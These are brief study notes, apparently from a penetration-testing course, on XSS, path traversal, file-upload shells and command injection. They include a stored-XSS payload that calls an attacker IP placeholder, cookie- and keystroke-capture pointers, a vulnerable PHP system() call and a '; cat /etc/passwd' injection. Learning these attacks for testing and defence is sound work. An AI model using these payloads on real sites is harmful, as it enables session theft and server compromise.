## Enumeration

## Cross-Site scripting (XSS) Overview
* Insertion of arbitrary code into a webpage, that executes in the browser of visitors
* Unsanitized GET, POST, and POST methods allow JS to be placed on websites
* Often found in forums that allow HTML
## Reflected XXS
* Most common form of XSS
* Transient, occurs in error messages or search results
* Delivered through intermediate media, such as a link in an emial
* Characters that are normally illegal in URLs can be Base64 encoded
## Stored XSS
* Resides on vulnerable site
* Only requires user to visit page
```
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
```
## Useful Javascript components
* Proof of concept (simple alert)
  - `<script>alert('XSS');</script>`
* Capturing Cookies
  - `document.cookie`
* Capturing Keystrokes
  - `bind keydown and keyup`
* Capturing Sensitive Data
  - `document.body.innerHTML`
## Server-Side Injection
* Ability to read/execute outside web server's directory
* Uses `../../` (relative Paths) in manipulating a server-side file path
## Malicious File Upload
* Server Doesnt Validate extension or size
* Allows or code execution (shell)
* Once uploaded
  - Find your file
  - Call your file
## Command Injection
* User input not validated
* Might contain the following in itâ€™s code:
```
system("ping -c 1 ".$_GET["ip"]);
```
* Run the following to chain/stack our arbitrary command
```
; cat /etc/passwd
```
